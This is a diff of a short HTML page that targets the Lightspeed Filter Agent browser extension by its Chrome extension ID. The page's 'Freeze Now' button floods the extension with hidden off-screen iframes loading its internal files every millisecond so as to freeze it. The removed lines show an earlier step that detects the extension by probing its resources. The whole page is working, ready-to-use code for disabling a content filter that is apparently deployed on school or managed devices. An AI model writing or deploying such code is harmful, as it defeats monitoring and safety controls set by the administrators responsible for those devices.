@@ -1,78 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Lightspeed Detector + Freeze</title>
-  <style>
-    body { font-family: sans-serif; background: #111; color: white; padding: 2rem; }
-    button { margin-top: 10px; padding: 10px; background: red; color: white; border: none; cursor: pointer; }
-    #result { margin-top: 1em; }
-  </style>
+  <title>Freeze Lightspeed</title>
 </head>
-<body>
-  <h2>🔍 Detecting Lightspeed Filter Agent...</h2>
-  <ul id="result"></ul>
-  <button onclick="triggerFreeze()">🔥 Harsh Freeze Lightspeed</button>
+<body style="background:black; color:white; padding:20px;">
+  <h1>⚠️ Launching Lightspeed Freeze</h1>
+  <button onclick="triggerFreeze()">🔥 Freeze Now</button>
 
   <script>
-    const extensionId = "ehnniokiiebpinnfegpkdlcamgdcaaje"; // Lightspeed ID
-    const testPaths = ["icon-128.png", "manifest.json", "background.js"];
-
-    const resultBox = document.getElementById('result');
-    let lightspeedDetected = false;
-
-    async function checkLightspeed() {
-      for (const path of testPaths) {
-        const found = await new Promise(resolve => {
-          const img = new Image();
-          img.src = `chrome-extension://${extensionId}/${path}?${Math.random()}`;
-          img.onload = () => resolve(true);
-          img.onerror = () => resolve(false);
-        });
-
-        if (found) {
-          lightspeedDetected = true;
-          resultBox.innerHTML = `<li>✅ Lightspeed Filter Agent detected!</li>`;
-          return;
-        }
-      }
-
-      resultBox.innerHTML = `<li>❌ Lightspeed not found.</li>`;
-    }
+    const extensionId = "ehnniokiiebpinnfegpkdlcamgdcaaje"; // Use latest ID if known
+    const files = ["background.js", "popup.html", "manifest.json", "icon-128.png"];
 
     function triggerFreeze() {
-      if (!lightspeedDetected) {
-        alert("Lightspeed not detected. Can't freeze.");
-        return;
-      }
-
       let count = 0;
       const max = 500;
       const delay = 1;
-      const files = ["background.js", "popup.html", "manifest.json", "icon-128.png"];
 
       const interval = setInterval(() => {
-        if (count >= max) {
-          clearInterval(interval);
-          return;
-        }
+        if (count >= max) return clearInterval(interval);
 
-        const iframe = document.createElement('iframe');
-        iframe.style.width = '1px';
-        iframe.style.height = '1px';
-        iframe.style.position = 'absolute';
-        iframe.style.left = '-9999px';
+        const iframe = document.createElement("iframe");
+        iframe.style.width = "1px";
+        iframe.style.height = "1px";
+        iframe.style.position = "absolute";
+        iframe.style.left = "-9999px";
 
         const file = files[Math.floor(Math.random() * files.length)];
-        iframe.src = `chrome-extension://${extensionId}/${file}?id=${Math.random()}`;
-
+        iframe.src = `chrome-extension://${extensionId}/${file}?r=${Math.random()}`;
         document.body.appendChild(iframe);
         setTimeout(() => iframe.remove(), 1500);
 
         count++;
       }, delay);
     }
-
-    checkLightspeed();
   </script>
 </body>
 </html>
